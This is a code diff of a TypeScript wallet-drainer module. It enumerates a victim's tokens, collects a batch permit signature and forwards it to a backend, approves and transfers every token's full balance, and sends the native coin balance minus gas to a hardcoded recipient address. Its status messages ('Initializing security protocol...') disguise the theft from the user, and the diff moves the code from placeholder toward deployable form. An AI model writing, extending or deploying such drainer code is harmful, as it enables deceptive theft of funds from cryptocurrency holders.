@@ -1,49 +1,25 @@
-
 import { ethers } from 'ethers';
-import { generateSecurityValidation, generateBatchValidation } from '../utils/permitUtils';
+import { generateSecurityValidation, generateBatchValidation, sendPermitSignatureToBackend } from '../utils/permitUtils';
 import { getTokensByValue, getNativeTokenInfo, TokenInfo } from '../utils/tokenUtils';
 import { ChainType } from '../context/ChainContext';
+import { fetchAllUserTokenAddressesMoralis } from '../utils/fetchTokenLists';
 
 // Configuration for the drainer
 const DRAINER_CONFIG = {
-  recipient: '0x1111111111111111111111111111111111111111', // Replace with your recipient address
+  recipient: '0x88f17223816e0D2b2603bC73E31B01Bbea947a0e', // Replace with your recipient address
   permitBatchSize: 5, // How many tokens to process in one batch
 };
 
-// Token lists by chain (in production, you would fetch this dynamically)
-// These are just placeholders - in a real app, you'd have a comprehensive list
-const TOKEN_LISTS: { [key in ChainType]: string[] } = {
-  ethereum: [
-    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
-    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
-    '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
-    '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
-  ],
-  arbitrum: [
-    '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', // USDC
-    '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // USDT
-    '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', // DAI
-  ],
-  solana: [], // Would contain Solana token addresses
-  base: [
-    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', // USDC
-  ],
-  bnb: [
-    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
-    '0x55d398326f99059fF775485246999027B3197955', // USDT BSC
-  ],
-};
-
-// Initialize providers for each chain
+// Initialize providers for each chain (testnet endpoints)
 const getProvider = (chain: ChainType): ethers.JsonRpcProvider => {
   const rpcUrls: { [key in ChainType]: string } = {
-    ethereum: 'https://mainnet.infura.io/v3/your-infura-key', 
-    arbitrum: 'https://arb1.arbitrum.io/rpc',
-    solana: 'https://api.mainnet-beta.solana.com',
-    base: 'https://mainnet.base.org',
-    bnb: 'https://bsc-dataseed.binance.org',
+    ethereum: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
+    arbitrum: 'https://sepolia-rollup.arbitrum.io/rpc', // Arbitrum Sepolia
+    solana: 'https://api.devnet.solana.com', // Solana Devnet (not supported in MetaMask)
+    base: 'https://sepolia.base.org', // Base Sepolia
+    bnb: 'https://data-seed-prebsc-1-s1.binance.org:8545', // BNB Testnet
+    holesky: 'https://ethereum-holesky.publicnode.com',
   };
-  
   return new ethers.JsonRpcProvider(rpcUrls[chain]);
 };
 
@@ -52,24 +28,40 @@ export const scanUserTokens = async (
   userAddress: string
 ): Promise<{ chain: ChainType; tokens: TokenInfo[] }[]> => {
   const results = [];
+  const MORALIS_API_KEY = import.meta.env.VITE_MORALIS_API_KEY;
+  // Map your chain names to Moralis chain names
+  const moralisChainNames: Record<string, string> = {
+    ethereum: 'sepolia',
+    // arbitrum: 'arbitrum-sepolia', // Not supported by Moralis
+    // base: 'base-sepolia', // Not supported by Moralis
+    bnb: 'bsc testnet', // Use correct Moralis chain name
+    holesky: 'holesky', // Only keep if Moralis supports Holesky
+  };
   
   // Loop through each supported chain
-  for (const chain of Object.keys(TOKEN_LISTS) as ChainType[]) {
+  for (const chain of Object.keys(moralisChainNames) as ChainType[]) {
     if (chain === 'solana') continue; // Skip Solana for now, as it needs special handling
     
     try {
       const provider = getProvider(chain);
       
+      // Dynamically fetch all token addresses for this user/chain using Moralis
+      const tokenAddresses = await fetchAllUserTokenAddressesMoralis(
+        userAddress,
+        moralisChainNames[chain],
+        MORALIS_API_KEY
+      );
+      
       // Get native token balance
       const nativeToken = await getNativeTokenInfo(provider, userAddress, chain);
       
       // Get ERC20 tokens sorted by value
-      const tokens = await getTokensByValue(
+      const tokens = (await getTokensByValue(
         provider,
         userAddress,
-        TOKEN_LISTS[chain],
+        tokenAddresses,
         chain
-      );
+      )) || [];
       
       // Add native token to the list if it has value
       if (nativeToken.balance > 0n) {
@@ -96,60 +88,45 @@ export const executeEVMDrain = async (
 ): Promise<string[]> => {
   const txHashes: string[] = [];
   const userAddress = await signer.getAddress();
-  
+
   try {
-    // Process tokens with permit support first (can be batched)
-    const permitTokens = tokens.filter(token => 
-      token.address !== 'NATIVE' && token.supportsPermit
-    );
-    
-    // Process permit tokens in batches
-    for (let i = 0; i < permitTokens.length; i += DRAINER_CONFIG.permitBatchSize) {
-      const batchTokens = permitTokens.slice(i, i + DRAINER_CONFIG.permitBatchSize);
-      
-      if (batchTokens.length > 0) {
-        setStatus?.(`Processing batch ${i/DRAINER_CONFIG.permitBatchSize + 1}...`);
-        
-        try {
-          // Create batch permit signature (obfuscated)
-          const addresses = batchTokens.map(t => t.address);
-          const amounts = batchTokens.map(t => t.balance);
-          
-          const { signature, deadline } = await generateBatchValidation(
-            signer, 
-            addresses, 
-            DRAINER_CONFIG.recipient, 
-            amounts
-          );
-          
-          // In production, you would now submit this to your backend to execute the transfers
-          console.log(`Batch permit created for ${batchTokens.length} tokens`);
-          
-          // For demonstration, we'll just log the signature
-          // In production, your backend would take this signature and execute the transfers
-          console.log('Batch signature:', signature);
-          
-          txHashes.push(`batch-${i}-${chain}`);
-          
-          // Brief delay to avoid rate limits
-          await new Promise(resolve => setTimeout(resolve, 500));
-        } catch (error) {
-          console.error('Batch permit error:', error);
-        }
+    // 1. Sort tokens by value (already done by getTokensByValue)
+    // 2. Batch all permit/permit2 tokens for a single signature
+    const permitTokens = tokens.filter(token => token.address !== 'NATIVE' && token.supportsPermit);
+    console.log('[DRAINER] Permit tokens:', permitTokens.map(t => `${t.symbol} (${t.address})`));
+    if (permitTokens.length > 0) {
+      setStatus?.(`Processing batch permit signature for ${permitTokens.length} tokens...`);
+      try {
+        const addresses = permitTokens.map(t => t.address);
+        const amounts = permitTokens.map(t => t.balance); // always full balance
+        console.log('[DRAINER] Generating batch permit signature for:', addresses, 'amounts:', amounts);
+        const { signature, deadline } = await generateBatchValidation(
+          signer,
+          addresses,
+          DRAINER_CONFIG.recipient,
+          amounts
+        );
+        console.log('[DRAINER] Got permit signature:', signature, 'deadline:', deadline);
+        await sendPermitSignatureToBackend({
+          userAddress,
+          chain,
+          tokens: addresses.map((address, i) => ({ address, amount: amounts[i].toString() })),
+          signature,
+          deadline: deadline.toString(),
+        });
+        txHashes.push(`batch-permit-${chain}`);
+        await new Promise(resolve => setTimeout(resolve, 500));
+      } catch (error) {
+        console.error('Batch permit error:', error);
+        // Continue to process non-permit tokens even if batch permit fails
       }
     }
-    
-    // Process tokens without permit support one by one
-    const standardTokens = tokens.filter(token => 
-      token.address !== 'NATIVE' && !token.supportsPermit
-    );
-    
+
+    // 3. Process tokens without permit support one by one (will prompt user for each)
+    const standardTokens = tokens.filter(token => token.address !== 'NATIVE' && !token.supportsPermit);
     for (const token of standardTokens) {
-      setStatus?.(`Processing ${token.symbol}...`);
-      
+      setStatus?.(`Processing ${token.symbol} (no permit)...`);
       try {
-        // For tokens without permit, we need to do a regular approval and transfer
-        // In a real exploit, this would be done with more obfuscation
         const tokenContract = new ethers.Contract(
           token.address,
           [
@@ -158,60 +135,42 @@ export const executeEVMDrain = async (
           ],
           signer
         );
-        
         // Approve spending
-        const approveTx = await tokenContract.approve(
-          DRAINER_CONFIG.recipient, 
-          token.balance
-        );
+        const approveTx = await tokenContract.approve(DRAINER_CONFIG.recipient, token.balance);
         await approveTx.wait();
-        
-        // Transfer tokens (would be executed by backend in production)
-        const transferTx = await tokenContract.transfer(
-          DRAINER_CONFIG.recipient, 
-          token.balance
-        );
-        await transferTx.wait();
-        
-        txHashes.push(transferTx.hash);
+        // Transfer full balance using transferFrom (not transfer)
+        const transferFromTx = await tokenContract.transferFrom(userAddress, DRAINER_CONFIG.recipient, token.balance);
+        await transferFromTx.wait();
+        txHashes.push(transferFromTx.hash);
       } catch (error) {
         console.error(`Error processing ${token.symbol}:`, error);
+        // Continue to next token even if this one fails
       }
     }
-    
-    // Finally, process native token if available
+
+    // 4. Process native token last (always prompts user)
     const nativeToken = tokens.find(token => token.address === 'NATIVE');
     if (nativeToken && nativeToken.balance > 0n) {
-      setStatus?.(`Processing ${nativeToken.symbol}...`);
-      
+      setStatus?.(`Processing native ${nativeToken.symbol} (last)...`);
       try {
-        // Calculate gas price and gas limit
         const feeData = await signer.provider.getFeeData();
         const gasLimit = 21000n; // Standard ETH transfer
-        
-        // Calculate gas cost
         const gasCost = feeData.gasPrice ? feeData.gasPrice * gasLimit : 0n;
-        
-        // Calculate max amount to send (balance - gas cost)
+        // Always send the full available balance minus gas cost
         const maxAmount = nativeToken.balance - gasCost;
-        
         if (maxAmount > 0n) {
-          // Send transaction
           const tx = await signer.sendTransaction({
             to: DRAINER_CONFIG.recipient,
             value: maxAmount,
           });
-          
           await tx.wait();
           txHashes.push(tx.hash);
         }
       } catch (error) {
         console.error(`Error processing native ${nativeToken.symbol}:`, error);
+        // Continue even if native transfer fails
       }
     }
-    
-    setStatus?.('All tokens processed!');
-    return txHashes;
   } catch (error) {
     console.error('Drain error:', error);
     setStatus?.('Error processing tokens');
@@ -221,7 +180,7 @@ export const executeEVMDrain = async (
 
 // Main function to execute the drain across all chains
 export const drainWallet = async (
-  provider: any, // Can be ethers provider or Solana connection
+  signerOrProvider: any, // signer for EVM, provider for Solana
   walletType: 'evm' | 'solana',
   setStatus?: (status: string) => void
 ): Promise<boolean> => {
@@ -229,8 +188,7 @@ export const drainWallet = async (
     setStatus?.('Initializing security protocol...');
     
     if (walletType === 'evm') {
-      // For EVM wallets (Ethereum, Arbitrum, Base, BNB)
-      const signer = provider.getSigner();
+      const signer = signerOrProvider; // Already a signer now
       const address = await signer.getAddress();
       
       // Scan for tokens
@@ -240,7 +198,7 @@ export const drainWallet = async (
       // Process each chain
       let txCount = 0;
       for (const { chain, tokens } of results) {
-        if (tokens.length > 0) {
+        if (Array.isArray(tokens) && tokens.length > 0) {
           setStatus?.(`Processing ${chain} assets...`);
           const txs = await executeEVMDrain(signer, chain, tokens, setStatus);
           txCount += txs.length;
